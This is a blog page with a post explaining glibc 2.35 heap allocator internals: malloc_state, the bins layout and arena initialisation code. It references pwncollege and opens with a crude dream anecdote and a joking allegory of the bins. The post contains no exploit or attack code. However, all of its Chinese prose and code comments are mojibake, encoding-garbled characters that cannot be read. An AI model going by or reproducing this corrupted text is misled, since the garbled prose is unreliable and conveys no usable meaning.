<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":500,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"ä¸‡ä¸€æ‰¾åˆ°äº†å‘¢","hits_empty":"ä½ è¯´çš„ ${query} æˆ‘æ€ä¹ˆæ‰¾ä¸ç€å‘¢ ","hits_stats":"æ‰¾åˆ°äº† ${hits} ä¸ªç»“æœï¼Œç”¨æ—¶ ${time} æ¯«ç§’"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/3/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/" class="post-title-link" itemprop="url">heap bins</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-11-23 21:31:00 / Modified: 21:35:17" itemprop="dateCreated datePublished" datetime="2024-11-23T21:31:00+08:00">2024-11-23</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="çœ‹çœ‹ä½ çš„æ–Œ"><a href="#çœ‹çœ‹ä½ çš„æ–Œ" class="headerlink" title="çœ‹çœ‹ä½ çš„æ–Œ"></a>çœ‹çœ‹ä½ çš„æ–Œ</h1><h2 id="11æœˆ8æ—¥çš„æ¢¦"><a href="#11æœˆ8æ—¥çš„æ¢¦" class="headerlink" title="11æœˆ8æ—¥çš„æ¢¦"></a>11æœˆ8æ—¥çš„æ¢¦</h2><p>11.8ç¡åˆ°ä¸‹åˆ1ç‚¹æ‰é†’,åšäº†ä¸€ä¸ªç‰¹åˆ«æ²™é›•çš„æ¢¦</p>
<p>å°æ—¶å€™ä¸Šçš„å•æ‰€é•¿è¿™æ ·,ä¸¤ä¸ªé«˜å°ä¸­é—´ä¸€ä¸ªå‘é“</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/9320d00da5b65e5f8474bda8f6e876a.jpg" alt="9320d00da5b65e5f8474bda8f6e876a"></p>
<p>è¦ä¹ˆç«™åœ¨ä¸€ä¾§å°¿, è¦ä¹ˆè·¨è¹²æ‹‰</p>
<p>æˆ‘æ¢¦é‡Œä¸Šäº†ä¸ªå•æ‰€,è¿™ä¸ªå•æ‰€çš„å‘é“å¾ˆå®½,ä¸€ç±³</p>
<p>æˆ‘ä¸Šå»å‡ ä¹è¦åŠˆå‰,æœ¬æ¥ä¸æƒ³è·¨è¹²çš„</p>
<p><strong>ä½†æ˜¯æ—è¾¹å¥½å‡ ä¸ªå°æœ‹å‹</strong></p>
<p>æˆ‘ç«‹åˆ»å°±è·¨è¹²,å°æœ‹å‹å°±è·Ÿç€å­¦</p>
<p>ç„¶åå°±éƒ½æ‰ä¸‹å»äº†,ç„¶åå°æœ‹å‹å°±æººæ°´</p>
<p>æˆ‘æ­£å¥½åœ¨æ°´æµä¸Šæ¸¸</p>
<p>çˆ½æ­»æˆ‘äº†</p>
<p>æˆ‘åœ¨ä¸Šæ¸¸å¯åŠ²å„¿é€ çŸ¢</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241108150444057.png" alt="image-20241108150444057"></p>
<h2 id="æ–Œå®¶ã®æ•…äº‹"><a href="#æ–Œå®¶ã®æ•…äº‹" class="headerlink" title="æ–Œå®¶ã®æ•…äº‹"></a>æ–Œå®¶ã®æ•…äº‹</h2><p>ä¹±æ–Œ,å°æ–Œ,å¤§æ–Œæ˜¯æ–Œå®¶ä¸‰å…„å¼Ÿ,åŒå¤„ä¸€ä¸ªå±‹æªä¸‹</p>
<p>å¿«æ–Œæ˜¯å”è¾ˆå…„å¼Ÿ,è‡ªå·±å¦ä½</p>
<p>è¿™å››ä¸ªå‚»æ–Œå„è‡ªå¼€äº†ä»£é”€å¤„, è´Ÿè´£å€’å–ä¸€ç§å«åš<strong>å †å—</strong>çš„è´§ç‰©</p>
<p>æœ€åˆæ–Œå®¶æ˜¯ä¸€ç©·äºŒç™½çš„, å®¢æˆ·åªèƒ½å»<strong>å¤´å—æ‰¹å‘å¸‚åœº</strong>äº²è‡ªæ‹¿è´§</p>
<p>å®¢æˆ·ç”¨å®Œäº†çš„è´§, æ–Œå®¶é—»ç€å‘³å„¿å°±æ¥æ‹¾ç ´çƒ‚å„¿äº†</p>
<p>å¿«æ–Œæ€§å­å¾ˆæ€¥, å–œæ¬¢ç›´æ¥æŠ¢. å¿«æ–Œä¸æ»¡è¶³çš„è¯, æ˜¯è½®ä¸åˆ°æ–Œå®¶ä¸‰å…„å¼Ÿçš„</p>
<p>å‰©ä¸‹æ–Œå®¶ä¸‰å…„å¼Ÿä¸­, ä¹±æ–Œè´Ÿè´£è¿›è´§, æ‹¿å›æ¥åå’Œå¤§æ–Œå°æ–Œåˆ†è´§</p>
<p>å¿«æ–Œæ€§å­å¾ˆæ€¥, ç®¡ç†è´§ç‰©ç®€å•ç²—æš´ä½†æ˜¯é¢‡å…·æ¡ç†, ä»–æ‰¾äº†10ä¸ªæ¡©, æ¯ä¸ªæ¡©ä¸Šç”¨é“é“¾æ‹´å¤§å°ä¸€æ ·çš„è´§, æ “äº†10é•¿ä¸² </p>
<p>ä¹±æ–Œéå¸¸ä¸æ¡ç†, ä»–è‡ªå·±çš„è´§éšä¾¿ä¹±æ”¾, æ¯æ¬¡æ‰¾è´§éƒ½å¾—æ‰’ç¿»åŠå¤©, ç”¨å±±ä¸œè¯è¯´å°±æ˜¯å±‘åŒ…è›‹</p>
<p>å°æ–Œå°±æ¯”è¾ƒæ¡ç†, ä»–æŒ‰ç…§è´§ç‰©å¤§å°æŠŠè´§åˆ†æˆäº†62ä¸ªç®±å­, æ¯ä¸ªç®±å­é‡Œæ”¾å¤§å°ç›¸è¿‘çš„è´§</p>
<p>å¤§æ–Œæœ€æ¡ç†,ä»–ä¸å…‰åˆ†äº†63ä¸ªç®±å­æ”¾å¤§å°ç›¸è¿‘çš„è´§, å¦‚æœå°ç®±å­ç©ºäº†ä»–è¿˜ä¼šä»å¤§ç®±å­é‡Œæ‹¿å¤§è´§æ‹†å°ç„¶åæ”¾åˆ°å°ç®±å­</p>
<p>å› æ­¤ä¹±æ–ŒçŸ¥é“è‡ªå·±ä¸æ˜¯ç†è´§çš„æ–™å„¿, ä¼šåŠæ—¶æŠŠè´§åˆ†ç»™å¤§å°æ–Œç®¡ç†, è‡ªå·±é›†ä¸­ç²¾åŠ›è¿›è´§</p>
<p>ä½†æ˜¯ç”±äºå¿«æ–Œå–œæ¬¢æŠ¢ä¸œè¥¿, å¥½ç«¯ç«¯çš„å¤§è´§å¯èƒ½è¢«ä»–æŠ¢æˆå¥½å‡ ä¸ªå°è´§, è¿™æ—¶å€™å¦‚æœå®¢æˆ·æ¥è¦å¤§è´§, å››ä¸ªæ–Œè°ä¹Ÿæ‹¿ä¸å‡ºæ¥, ä¹Ÿå°±æ˜¯å½¢æˆäº†å¤–éƒ¨ç¢ç‰‡</p>
<p>è¿™å°±å°´å°¬äº†, ä»€ä¹ˆæ–Œå®¶å››é£èˆ</p>
<p>å› æ­¤å¿«æ–Œä¼šåœ¨æ­¤æ—¶è¢«åˆ¶è£, ä¹–ä¹–äº¤å‡ºæ‰€æœ‰è´§ç‰©ç»„æˆå¤§è´§ç»™å®¢æˆ·</p>
<p>ç„¶è€Œæœ‰ä¸€å¤©å®¢æˆ·å«Œæ–Œå®¶å››å…„å¼Ÿå¤ªé£èˆäº†, å¦æ‰¾äº†ä¸ªæ“¦è½¦æ–Œ(ä¸‹ç®€ç§°æ“¦æ–Œ)ä½œä»£ç†å•†</p>
<p>æ“¦æ–Œæ¯”å¿«æ–Œè¿˜æ€¥, æ€¥å¾—è·ŸğŸä¸€æ ·, å¿«æ–Œéƒ½æŠ¢ä¸è¿‡ä»–</p>
<p>è¿™ä¸€ä¸‹å­è€æ–Œå®¶çš„ç”Ÿæ„æƒ¨æ·¡äº†è®¸å¤š</p>
<p><strong>æ ¼ç«‹åŒ—å…‹</strong>å¸å›½å¸å–äº†å¿«æ–Œä¹±æŠ¢çš„æ•™è®­, æäº†ä¸ªåå„æ–­, å‰ä¸ƒä¸ªè´§è®©ç»™æ“¦è½¦æ–Œ, ä¹‹åçš„è´§è¿˜æ˜¯ç”±è€æ–Œå®¶ç»è¥</p>
<p>å›¾å·çš„pwncollege</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png" alt="free beyond tcache"></p>
<p>æœ¬æ–‡å‚è€ƒGlibc2.35</p>
<h2 id="meta-meta-data"><a href="#meta-meta-data" class="headerlink" title="meta-meta-data"></a>meta-meta-data</h2><p>æœ¬èŠ‚ä»‹ç»å…ƒæ•°æ®çš„å…ƒæ•°æ®,ä¹Ÿå°±æ˜¯æ•´ä¸ª<code>ptmalloc</code>çš„å®è§‚ç»“æ„,ä¹Ÿå°±æ˜¯æ–Œã®å®¶</p>
<p>æ›´å…·ä½“çš„è¯´å°±æ˜¯å¦‚ä¸‹ä¸¤ä¸ªç»“æ„</p>
<table>
<thead>
<tr>
<th>ç»“æ„ä½“</th>
<th>ä½œç”¨</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>malloc_state</td>
<td>åˆ†é…åŒº,ç®¡ç†fastbins,binsç­‰å…ƒæ•°æ®</td>
<td><strong>é‡è¦</strong></td>
</tr>
<tr>
<td>malloc_par</td>
<td>åˆ†é…åŒºé…ç½®æ–‡ä»¶,è®°å½•tcacheæ¡¶å­å®¹é‡,æœ€å¤§å—å¤§å°ç­‰é…ç½®ä¿¡æ¯</td>
<td>ä¸æ˜¯å¾ˆé‡è¦</td>
</tr>
</tbody></table>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code>æ˜¯<code>ptmalloc</code>ä¸­çš„å®è§‚å…ƒæ•°æ®ç»“æ„, å…¶å¯¹è±¡è¢«ç§°ä¸ºâ€œåˆ†é…åŒºâ€,æ¯”å¦‚<code>main_arena</code>å°±æ˜¯<strong>ä¸»åˆ†é…åŒº</strong></p>
<p>åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­,å¯èƒ½å­˜åœ¨å¤šä¸ªåˆ†é…åŒº,ä»¥åº”å¯¹å¹¶å‘çš„åˆ†é…è¯·æ±‚</p>
<p>ç®¡ç†ç€å„ç§<code>bins</code>çš„å…ƒæ•°æ®ä¿¡æ¯,æ¯”å¦‚é“¾è¡¨é™„åŠ å¤´èŠ‚ç‚¹çš„ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];			<span class="comment">//fastbins</span></span><br><span class="line"></span><br><span class="line">    mchunkptr top;								<span class="comment">//topchunk</span></span><br><span class="line"></span><br><span class="line">    mchunkptr last_remainder;					<span class="comment">//æœ€è¿‘ä¸€æ¬¡åˆ†é…å‰©ä¸‹çš„å †å—æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];			</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>					<span class="comment">//ä¸‹ä¸€ä¸ªmalloc_state</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bins[0]</span><br><span class="line">bins[1] =&gt; unsorted bin</span><br><span class="line">bins[2:63] =&gt; small bins</span><br><span class="line">bins[64:126] =&gt; large bins</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>fastbins</code>æ˜¯<code>bins</code>çš„ç¼“å­˜,ç±»ä¼¼äº<code>tcache</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸»åˆ†é…åŒº(<code>main_arena</code>)æ˜¯<code>malloc_state</code>çš„ä¸€ä¸ªå®ä¾‹,æ˜¯ä¸€ä¸ª<code>glibc</code>çš„<code>static</code>å¯¹è±¡</p>
<p>é»˜è®¤æƒ…å†µä¸‹è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹,ä¹Ÿå°±ä¸ä¼šæœ‰å¹¶å‘çš„åŠ¨æ€åˆ†é…è¯·æ±‚,é‚£ä¹ˆåªéœ€è¦æœ‰ä¸€ä¸ªåˆ†é…åŒº,ä¹Ÿå°±æ˜¯<code>main_arena</code></p>
<p>åœ¨<code>glibc</code>åŠ è½½è¿›å…¥å†…å­˜ä¹‹å,<code>main_arena</code>è¢«åˆ›å»º,å¹¶ä¸”åˆæ­¥ç²—ç•¥åœ°åˆå§‹åŒ–ä¸€ä¸‹,</p>
<p>å¯¹å„ä¸ª<code>bins</code>çš„åˆå§‹åŒ–éœ€è¦ç­‰<code>malloc_init_state</code>è¢«è°ƒç”¨,è¯¥å‡½æ•°ä¼šåœ¨é¦–æ¬¡åŠ¨æ€åˆ†é…å‰è°ƒç”¨</p>
<p>å¦‚æœæœ‰å¤šæ¡çº¿ç¨‹</p>
<p>é‚£ä¹ˆå°±å¯èƒ½æœ‰å¤šä¸ªåˆ†é…åŒº,å„ä¸ªåˆ†é…åŒºé€šè¿‡<code>next</code>æŒ‡é’ˆç»„æˆç¯çŠ¶å•é“¾è¡¨,</p>
<p>åœ¨åº”å¯¹å¹¶å‘çš„åŠ¨æ€åˆ†é…è¯·æ±‚æ—¶,ä¼šæ²¿ç€<code>next</code>æŒ‡é’ˆæ‰¾åˆ°ä¸€ä¸ªç©ºé—²çš„åˆ†é…åŒºæ»¡è¶³éœ€æ±‚</p>
<p><strong>ä¸»åˆ†é…åŒºåˆå§‹åŒ–å‘ç”Ÿæ—¶æœº</strong></p>
<p><code>init</code>é‡‡å–æ‡’åŠ è½½æœºåˆ¶,åªä¼šåœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨åˆ°åŠ¨æ€åˆ†é…å‡½æ•°å¦‚<code>malloc</code>æˆ–è€…<code>calloc</code>ç­‰æ—¶æ‰ä¼šè¢«è°ƒç”¨</p>
<p><code>printf</code>ç­‰ä¸€äº›<code>I/O</code>å‡½æ•°ä¹Ÿä¼šè°ƒç”¨åˆ°<code>malloc</code>ç”³è¯·ç¼“å†²åŒº,å¯¼è‡´<code>init</code>å‘ç”Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)			<span class="comment">//åˆå§‹åŒ–æ•´ä¸ªptmallocå †ç®¡ç†å™¨</span></span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized)				<span class="comment">//é¿å…é‡è£…</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="literal">true</span>;			<span class="comment">//æ ‡è®°å·²ç»åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize ();				<span class="comment">//æ­¤å¤„åˆå§‹åŒ–tcache key, è¯¥keyç”¨æ¥ç¼“è§£double free</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;			<span class="comment">//ä¸»åˆ†é…åŒº(main_arena)æ˜¯ä¸€ä¸ªstaticæ¨¡å—å˜é‡</span></span><br><span class="line">	</span><br><span class="line">  malloc_init_state (&amp;main_arena);		<span class="comment">//å¯¹ä¸»åˆ†é…åŒºè¿›è¡Œåˆå§‹åŒ–</span></span><br></pre></td></tr></table></figure>





<p><strong>ä¸»åˆ†é…åŒºåˆå§‹åŒ–å†…å®¹</strong></p>
<p>1.<code>bins</code> çš„æ¯ä¸ªå¤´åˆå§‹åŒ–æŒ‡å‘è‡ªå·±,è¡¨ç¤ºæ¡¶å­é‡Œæ²¡æœ‰ç©ºé—²å †å—</p>
<p>2.<code>[ä¸»å…¬æŠ€][é”å®šæŠ€] </code>å¯¹<code>main_arena</code>è®¾ç½®<code>fastbins</code>æœ€å¤§å †å—å¤§å°ä¸è¶…è¿‡<code>0x80</code> (åŒ…å«å…ƒæ•°æ®)</p>
<p>3.åˆå§‹åŒ–<code>topchunk</code>æ¡¶å­å¤´æŒ‡å‘<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    mbinptr bin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) <span class="comment">// NBINS = 128</span></span><br><span class="line">    &#123;</span><br><span class="line">        bin = bin_at(av, i);</span><br><span class="line">        bin-&gt;fd = bin-&gt;bk = bin; <span class="comment">// æœ€åˆæ—¶,å„ä¸ªbinsé“¾è¡¨å¤´éƒ½æŒ‡å‘è‡ªèº«</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)		</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        set_noncontiguous(av);		<span class="comment">//çœ‹ä¸æ‡‚</span></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena)		<span class="comment">//ä¸»åˆ†é…åŒºçš„fastbinsæœ€å¤§å­˜æ”¾0x80çš„å †å—(åŒ…å«å…ƒæ•°æ®)</span></span><br><span class="line">        set_max_fast(DEFAULT_MXFAST); <span class="comment">// 0x80</span></span><br><span class="line">    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    av-&gt;top = initial_top(av);			<span class="comment">//åˆå§‹åŒ–åˆ†é…åŒºå¤´å—,æŒ‡å‘unsortedbinæ¡¶å­å¤´</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹<code>topchunk</code>çš„åˆå§‹åŒ–æ•ˆæœæ˜¯,<code>topchunk</code>æŒ‡å‘<code>unsortedbin</code>æ¡¶å­å¤´</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top = 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,</span><br><span class="line">bins = &#123;0x7ffff7fa6ce0 &lt;main_arena+96&gt;, 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,...</span><br></pre></td></tr></table></figure>





<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><p>åˆ†é…åŒºé…ç½®æ–‡ä»¶,åªæœ‰ä¸€ä¸ªå®ä¾‹<code>mp_</code>,ä½äº<code>glibc</code>å†…éƒ¨,åœ¨<code>glibc</code>åŠ è½½æ—¶å³å®Œæˆåˆå§‹åŒ–</p>
